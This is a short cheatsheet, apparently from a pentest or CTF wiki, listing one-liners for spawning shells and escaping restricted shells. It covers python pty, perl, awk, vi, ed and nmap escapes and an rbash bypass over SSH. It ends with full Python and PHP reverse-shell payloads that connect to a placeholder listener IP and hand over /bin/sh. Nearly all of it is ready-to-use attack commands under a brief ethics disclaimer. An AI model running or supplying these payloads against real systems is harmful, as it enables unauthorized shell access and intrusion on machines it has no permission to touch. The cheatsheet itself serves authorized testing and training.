Spawning shell cheatsheet
=======

__Attention: The articles published on this wiki are for education purpose, to use during a CTF or for an authorized penetrationtest. By using the wiki, you've agreed to use this knowledge in an ethical way and do not evil in any perspective.__

Python
---------
With an older version of Python.
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
Or with Python 3
```bash
python3 -c 'import os; os.system("/bin/sh");'
```

Bash
---------
```bash
echo os.system('/bin/bash')
```

Perl
---------
```bash
perl -e 'system("/bin/sh");'
```

Awk
---------
```bash
awk 'BEGIN {system("/bin/sh")}'
```



Vi
---------
From within vi it could be possible to breakout a restricted shell..
```bash
#(From within vi)
:!bash
```

```bash
vi
:set shell=/bin/sh
:shell
```

Ed
---------
```bash
ed
! '/bin/sh'
```

nmap
---------
It could be possible to breakout a restricted shell with an interactive nmap
```bash
nmap -i
```

Bypass rbash through SSH
---------
If you know the ssh credential of the user who is part of rbash shell, then you can use the following command along ssh to break the jail and bypass the rbash by accessing proper bash shell.
```bash
ssh user@IP-ADDRESS -t "bash --noprofile"
```

Bypass rbash through Reverse Shell
---------
__Python__
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LISTENING IP",LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

__PHP__
```bash
php -r '$sock=fsockopen("LISTENING IP",LISTENING PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```